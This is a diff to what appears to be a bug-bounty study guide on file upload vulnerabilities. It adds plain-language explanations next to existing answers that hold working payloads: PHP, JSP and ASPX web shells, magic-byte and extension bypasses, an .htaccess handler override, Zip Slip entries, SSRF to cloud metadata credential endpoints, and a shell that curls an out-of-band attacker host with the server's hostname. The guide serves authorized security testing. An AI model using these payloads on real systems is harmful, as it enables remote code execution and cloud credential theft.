@@ -32,6 +32,9 @@
 # LEVEL 0 — FUNDAMENTALS
 
 ### Q1. What is a file upload vulnerability?
+
+> *Plain version:* the "browse… upload" button looks harmless, but the server has to **do something** with your file — store it, resize it, parse it, serve it back. Each of those steps can be tricked. The whole class boils down to one question: *can I make the server treat my bytes as code (or as a dangerous document) somewhere I can reach?*
+
 It's any flaw in how an application accepts, validates, stores, processes, or serves user-supplied files that lets an attacker do something unintended. The classic worst case is **Remote Code Execution (RCE)** by uploading server-executable code (a "web shell"), but file upload is a *category* — it also leads to XSS, XXE, SSRF, LFI/path traversal, DoS, deserialization, and authorization bypass. The bug is rarely "upload allowed" alone; it's the combination of **what you can upload** × **where it lands** × **how it's served/processed**.
 
 ### Q2. Why are uploads so dangerous and so common in bug bounty?
@@ -51,11 +54,14 @@ The attacker maps all six stages; the vuln usually lives at the seam between two
 - **Restricted**: server tries to limit type/extension/content. Your job is to find the *gap* between the developer's mental model and the real parser behavior (extension parsing, MIME trust, magic-byte-only checks, processing pipelines).
 
 ### Q5. What is a web shell?
+
+> *Plain version:* a web shell is a tiny program you upload that the server will **run for you** every time you visit its URL — turning "upload a file" into "type commands on the server." For a bounty you don't need a full remote-control panel; a one-liner that prints a unique string proves the server executed your code, which is the whole point.
+
 A small server-side script you upload that, when requested via URL, executes attacker commands on the server. Minimal examples:
 - PHP: `<?php system($_GET['c']); ?>` → `GET /uploads/shell.php?c=id`
 - JSP: `<% Runtime.getRuntime().exec(request.getParameter("c")); %>`
 - ASPX: `<% Response.Write(new System.Diagnostics.Process...) %>`
-For bug bounty, a *proof* shell is enough — `<?php echo "RCE-POC-".phpinfo(); ?>` or `<?=md5(31337);?>` (expect `4e8d...`) avoids running real commands while proving execution.
+For bug bounty, a *proof* shell is enough — `<?php echo "RCE-POC-".phpinfo(); ?>` or `<?=md5(31337);?>` (expect `6f3249aa304055d63828af3bfab778f6`; PHP casts the int `31337` to the string `"31337"` before hashing) avoids running real commands while proving execution.
 
 ### Q6. RCE vs. "just" stored XSS via upload — which matters?
 Both are valid. RCE = Critical. Stored XSS via an uploaded HTML/SVG/file that runs in a victim's session on the app origin = High (account takeover potential). Even a "self-only" file that renders on a sensitive same-origin path can matter. Severity = where the file is served (origin) × who views it × what it can do.
@@ -64,6 +70,9 @@ Both are valid. RCE = Critical. Stored XSS via an uploaded HTML/SVG/file that ru
 HTTP `multipart/form-data` structure, how your target's stack maps extension→handler (Apache mod_mime, IIS handler mappings, Tomcat), the difference between MIME/`Content-Type`, file *extension*, and **magic bytes** (file signature), and how to use an intercepting proxy (Burp/Caido) to edit the raw request.
 
 ### Q8. What is the single most important mindset shift for upload bugs?
+
+> *Plain version:* everything the browser does to "check" your file is just a suggestion you can ignore — the real fight is between the server's *validator* (which decides "is this an image?") and the server's *executor/renderer* (which decides "what do I actually do with it?"). You win by making those two disagree.
+
 **The client is irrelevant; the server's parser is everything.** Every restriction you see in the browser is advisory. The win comes from making the *validator* and the *executor/renderer* disagree about what the file is.
 
 ---
@@ -98,6 +107,9 @@ Baseline + probe:
 3. If blocked, note *what* error you get (extension? MIME? size? content?) — that tells you the validation type to bypass.
 
 ### Q12. Why is "where the file lands and how it's served" critical?
+
+> *Plain version:* uploading a `.php` means nothing if it lands on an S3 bucket that only hands it back as a plain download — it never *runs*. The exact same file dropped into a folder the web server executes = instant RCE. So before you craft any payload, find out **where your file goes and what URL serves it back** — that alone decides the ceiling.
+
 You need the file to be **(a) in a location the webserver will execute/serve**, and **(b) reachable via a request**. If uploads go to S3 or a non-executing CDN, a `.php` won't run — but XSS/SVG/content-type bugs may still apply. Always confirm the retrieval URL and the response `Content-Type` of your uploaded file.
 
 ### Q13. How do I confirm RCE safely for a report?
@@ -143,6 +155,9 @@ Blacklists are incomplete by nature. Try every executable alias the handler acce
 Plus case variants and trailing tricks (Q21). Wordlists: SecLists `web-extensions.txt`.
 
 ### Q20. How do I attack an extension **whitelist** (only .jpg/.png/.pdf allowed)?
+
+> *Plain version:* a denylist ("block `.php`") is a bouncer with a list of banned names — you just use a name they forgot (`.phtml`). A whitelist ("only `.jpg`") is stricter, so instead you exploit the fact that the *validator* and the *web server* read the filename differently — `shell.php.jpg` looks like a jpg to one and runs as PHP on the other.
+
 Whitelists are stronger but breakable via **parser disagreements**:
 - **Double extension**: `shell.php.jpg` (if the server checks the *last* ext but the webserver executes on an *earlier* known ext via Apache `mod_mime` multi-extension parsing) or `shell.jpg.php` (if it checks the *first* ext / `strpos` mistakes).
 - **Trailing characters** the OS/webserver strip: `shell.php.` `shell.php ` (space), `shell.php%20`, `shell.php%00.jpg` (null byte — legacy PHP/Java), `shell.php;.jpg` (old IIS), `shell.php::$DATA` (NTFS Alternate Data Stream), `shell.php/`, `shell.php....` (Windows trims dots/spaces).
@@ -162,6 +177,9 @@ Whitelists are stronger but breakable via **parser disagreements**:
 | Uncommon exec ext | `x.phtml`, `x.phar` | handler maps it; blacklist forgot it. |
 
 ### Q22. What about **magic-byte / file-signature** validation?
+
+> *Plain version:* some servers don't trust the name or the header — they peek at the *first few bytes* to check it "really" starts like an image. You beat that by gluing a real image header onto the front of your payload (`GIF89a` + your PHP). The sniffer sees "yep, a GIF"; the PHP engine still finds and runs the `<?php` further down.
+
 Some servers read the first bytes to confirm it's a "real" image. Spoof the signature by **prepending the magic header** to your payload:
 - GIF: `GIF89a` then `<?php ... ?>` → `GIF89a<?php system($_GET['c']);?>`
 - PNG: `\x89PNG\r\n\x1a\n...`, JPEG: `\xFF\xD8\xFF\xE0`, PDF: `%PDF-1.5`
@@ -213,6 +231,9 @@ Use Burp Intruder / `fuxploider` / `upload_bypass` with a matrix of {extension l
 # LEVEL 3 — PER-TECHNOLOGY RCE
 
 ### Q33. `.htaccess` upload — the Apache RCE primitive. How?
+
+> *Plain version:* if the server only lets you upload "images," don't fight it — **change the rules of the room**. `.htaccess` is Apache's per-folder settings file; upload one that says "run `.jpg` files as PHP," then upload your PHP-as-a-jpg. You didn't smuggle an executable extension past the filter; you redefined what the allowed extension *means*.
+
 If you can upload a file named `.htaccess` into a directory Apache serves with `AllowOverride`, you redefine handlers so a benign extension runs as PHP:
 ```apache
 AddType application/x-httpd-php .jpg
@@ -280,6 +301,9 @@ Node doesn't execute uploaded `.js` by URL (no per-file handler), so think diffe
 No RCE via execution, but: stored **XSS** (HTML/SVG/JS served on a sensitive origin), **content-type sniffing** attacks, **open redirect via uploaded files**, **cache poisoning**, and **cloud** misconfig (S3 object overwrite, public ACL — Q65). Severity depends on origin and what scripts can reach.
 
 ### Q43. How does **LFI + upload** combine into RCE?
+
+> *Plain version:* two "meh" bugs become one Critical. The upload only accepts images? Fine — upload an image with PHP hidden inside (passes every image check). Separately, an LFI bug lets you tell the app "include this file." Point it at your image → PHP runs. Neither bug is RCE alone; together they are.
+
 If the app has Local File Inclusion (`include($_GET['page'])`), upload an *image* containing `<?php ?>` (passes image checks), then `?page=/uploads/cat.jpg` → PHP executes the embedded code. Upload doesn't need to allow `.php` at all. Also `phar://` (Q51) and PHP wrappers turn many "file read" bugs into RCE.
 
 ### Q44. CKEditor/TinyMCE/CMS upload bugs — why so common?
@@ -293,6 +317,9 @@ A huge share of real-world upload RCE is WP plugin arbitrary-file-upload CVEs (`
 # LEVEL 4 — CONTENT / PARSER ATTACKS (image, XML, polyglots)
 
 ### Q46. SVG uploads — why are they dangerous?
+
+> *Plain version:* an SVG isn't a picture like a JPEG — it's an XML **document that can carry `<script>`**. If the app shows your SVG inline on its own domain, that script runs in a victim's session = stored XSS. And because it's XML, the same file can also trigger XXE (file read / SSRF) when the server parses it. One upload, two whole bug classes.
+
 SVG is **XML + scriptable**. If served inline on the app origin (Content-Type `image/svg+xml`, not `attachment`), it executes:
 - **Stored XSS**:
 ```xml
@@ -360,6 +387,9 @@ Yes — pivot from *execution* to *processing*: a perfectly valid `.jpg` (right 
 # LEVEL 5 — ARCHIVES, RACE CONDITIONS, TRAVERSAL, DoS
 
 ### Q57. What is Zip Slip?
+
+> *Plain version:* when the server unzips your archive, it trusts the *names inside*. Name a file `../../../../var/www/html/shell.php` and a naive extractor happily writes it **outside** the intended folder — straight into the web root. So "upload a zip we'll extract" (themes, plugins, backup-restore) quietly becomes "write a file anywhere on the server."
+
 A path-traversal in archive extraction: a zip/tar entry named `../../../../var/www/html/shell.php` writes **outside** the intended dir on extract, overwriting arbitrary files → RCE/defacement/persistence. Affects many libs/languages (Snyk disclosure, 2018). Test any "upload a zip/import archive/restore backup/theme/plugin" feature. Build the evil zip with a crafted entry name (zip libs that don't sanitize), e.g. Python:
 ```python
 import zipfile
@@ -399,6 +429,9 @@ If filenames/paths are predictable or user-controlled and not namespaced per-use
 - **SSRF to metadata** (Q67) if the upload pipeline fetches URLs server-side.
 
 ### Q66. "Upload from URL" features — why are they SSRF goldmines?
+
+> *Plain version:* "paste a link and we'll grab the image" means **the server** makes the request, not you — so you point it at places only the server can reach: the cloud's internal metadata address (`169.254.169.254`) that hands out temporary access keys, or internal-only services. Grab the keys and you can own the whole cloud account. This is often the fastest Critical on the entire upload surface.
+
 If the app fetches a file from a user-supplied URL ("import from link", avatar-by-URL, webhook media), it's server-side request forgery: point it at `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (AWS), `http://metadata.google.internal/...` (GCP, needs `Metadata-Flavor` header — try gopher/redirect), internal services, `file://`, `gopher://`. The "file" you get back may leak cloud keys → full account compromise. Top-tier chain.
 
 ### Q67. Walk a real expert chain: avatar upload → cloud takeover.
@@ -433,6 +466,9 @@ When the upload's bytes are fed to an unsafe deserializer:
 Recognize the sink (import/restore/"open project"/session/state features) and bring the matching gadget chain.
 
 ### Q73. How do I detect *blind* upload RCE (no output, no reachable URL)?
+
+> *Plain version:* sometimes your code runs but you never see its output (the file's behind a processor, or you can't find its URL). So make the code **phone home** — have it do a DNS/HTTP request to a listener you control. If your listener gets a ping, the code ran, even though the page showed you nothing. Same trick proves blind XXE and SSRF.
+
 Out-of-band. Make the payload call your collaborator (Burp Collaborator / interactsh / `oast`):
 - PHP shell: `<?php system('curl https://ID.oast.fun/$(hostname|base64)'); ?>`
 - ImageMagick/ffmpeg/XXE/PDF SSRF: trigger DNS/HTTP to your OAST host.
